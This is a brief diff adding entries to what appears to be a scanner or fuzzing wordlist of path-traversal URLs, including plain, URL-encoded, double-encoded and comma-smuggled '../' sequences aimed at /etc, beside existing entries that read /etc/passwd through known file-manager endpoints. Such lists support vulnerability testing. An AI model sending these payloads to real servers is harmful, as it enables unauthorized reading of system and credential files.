@@ -46,3 +46,8 @@
 /laravel-filemanager/download?working_dir=%2F../../../../../../../../../../../../../../../../../../../etc&type=Files&file=passwd
 /resources/qmc/fonts/../../../qrs/ReloadTask?xrfkey=1333333333333337&filter=.ttf
 /hrm/hrm_e9/orgChart/js/jquery/plugins/jqueryFileTree/connectors/jqueryFileTree.jsp?dir=/page/resource/userfile/../../
+/application/default
+/application/..%2F..%2F..%2F..%2F..%2Fetc
+/application/..%2F..%2F..%2F..%2F..%2Fetc/main
+/application/..%252F..%252F..%252F..%252F..%252Fetc
+/application/default%2C..%2F..%2F..%2F..%2F..%2Fetc
